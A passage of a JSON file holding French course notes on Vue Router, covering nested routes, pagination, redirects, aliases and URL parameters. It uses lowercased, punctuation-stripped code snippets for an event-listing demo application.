      "content": "<! 'noaudio' > touring vue router introduction source: c 294 all01 touring vue router etml ict 294 . > pas d'audio objectif du module ce cours présente les fondamentaux de vue router et montre comment structurer une application à page unique spa avec vue.js. les notions abordées incluent : gestion des url navigation entre composants paramètres de requête et paramètres dynamiques pagination routes imbriquées redirections et alias rôle de vue router vue router permet de définir comment une application vue réagit aux changements d’url. la majorité de la configuration se trouve dans : src/router/index.js ce fichier définit : les chemins d’url path le composant associé component le nom de la route name les paramètres dynamiques :id la transmission de données via props les routes enfants children application utilisée le cours développe une application d’événements comprenant : liste d'événements pagination page de détails page d'inscription page d'édition layout partagé gestion de redirections cette application sert d'exemple pour toute la suite du module."
    },
    {
      "name": "Routes imbriquées",
      "file": "/public/markdown/Web-294/VueJS/2-Routes imbriquées.md",
      "content": "<! 'noaudio' > routes imbriquées nested routes source: c 294 all01 touring vue router etml ict 294 . > pas d'audio 1. structure de fichiers recommandée views/event/ layout.vue details.vue register.vue edit.vue 2. routage initial moins optimal js { path: \"/event/:id\", name: \"eventdetails\", component: eventdetails, props: true } problèmes : duplication de code requêtes api répétées 3. layout centralisé vue <router view :event=\"event\" /> 4. routes imbriquées js { path: \"/event/:id\", component: eventlayout, props: true, children: { path: \"\", name: \"eventdetails\", component: eventdetails, props: true }, { path: \"register\", name: \"eventregister\", component: eventregister, props: true }, { path: \"edit\", name: \"eventedit\", component: eventedit, props: true } } 5. avantages une seule requête api navigation cohérente code simplifié 6. composants enfants exemple details.vue : vue <p>{{ event.time }} on {{ event.date }} @ {{ event.location }}</p> <p>{{ event.description }}</p> 7. optimisation vue router réutilise automatiquement les params si non fournis dans router link."
    },
    {
      "name": "Pagination",
      "file": "/public/markdown/Web-294/VueJS/3-Pagination.md",
      "content": "<! 'noaudio' > pagination avec vue router source: c 294 all01 touring vue router etml ict 294 . > pas d'audio 1. modification du service api js getevents perpage, page { return apiclient.get /events?_limit=${perpage}&_page=${page} } 2. lecture de la page via le routeur js props: route => { page: parseint route.query.page || 1, } 3. chargement réactif dans eventlist.vue js watcheffect async => { events.value = null const response = await eventservice.getevents perpage, props.page events.value = response.data totalevents.value = parseint response.headers 'x total count' } 4. liens de pagination vue <router link v if=\"page > 1\" :to=\"{ name: 'eventlist', query: { page: page 1 } }\" >previous</router link> <router link v if=\"isnextpage\" :to=\"{ name: 'eventlist', query: { page: page + 1 } }\" >next</router link> 5. détection de la dernière page js const isnextpage = computed => { const totalpages = math.ceil totalevents.value / perpage return props.page < totalpages } 6. style minimal css .pagination { display: flex; justify content: space between; margin top: 1.5rem; } 7. points importants watcheffect déclenche un rechargement lorsque la page change x total count détermine le nombre de pages utiliser des routes nommées pour éviter les erreurs"
    },
    {
      "name": "Redirections et alias",
      "file": "/public/markdown/Web-294/VueJS/4-Redirections et alias.md",
      "content": "<! 'noaudio' > redirections et alias source: c 294 all01 touring vue router etml ict 294 . > pas d'audio 1. redirections simples js { path: \"/about us\", name: \"about\", component: about }, { path: \"/about\", redirect: { name: \"about\" } } 2. alias js { path: \"/about us\", component: about, alias: \"/about\" } 3. redirection dynamique js { path: \"/event/:id\", redirect: \"/events/:id\" } 4. wildcard js { path: \"/event/:after . \", redirect: \"/events/:after\" } 5. recommandations préférer redirect si l’ancienne url doit disparaître préférer alias si plusieurs url doivent rester valides"
    },
    {
      "name": "Synthese",
      "file": "/public/markdown/Web-294/VueJS/5-Synthese.md",
      "content": "<! 'noaudio' > vue router synthèse résumé des notions clés du cours touring vue router. > pas d'audio query et params query : $route.query params : $route.params props dans les routes props: true props: { ... } props: route => { ... } pagination paramètres json server : \\_limit, \\_page watcheffect pour la mise à jour header x total count pour calculer les pages routes imbriquées layout avec <router view> routes enfants dans children reduce duplication des requêtes api redirections redirect pour modification d’url alias pour double accès valide wildcard pour redirection globale structure recommandée router/ index.js views/ event/ layout.vue details.vue register.vue edit.vue"
    },
    {
      "name": "Paramètres URL",
      "file": "/public/markdown/Web-294/VueJS/6-Paramètres URL.md",
      "content": "<! 'noaudio' > paramètres d’url : query, params et props source: c 294 all01 touring vue router etml ict 294 . > pas d'audio 1. paramètres de requête query exemple : /events?page=4 dans un template : vue {{ $route.query.page }} dans le script : js const page = computed => $route.query.page 2. paramètres dynamiques params exemple : /events/4 définition dans le routeur : js { path: \"/events/:page\", component: eventlist } accès dans le composant : vue {{ $route.params.page }} 3. passer les paramètres comme props recommandé pour rendre les composants indépendants du routeur. js { path: \"/events/:page\", component: eventlist, props: true } dans le composant : js const props = defineprops 'page' 4. props en objet js props: { showextra: true } 5. props en fonction js props: route => { showextra: route.query.e === 'true', } 6. points clés query = $route.query params = $route.params props = découplage recommandé props fonction = transformation possible"
    }
  ]
}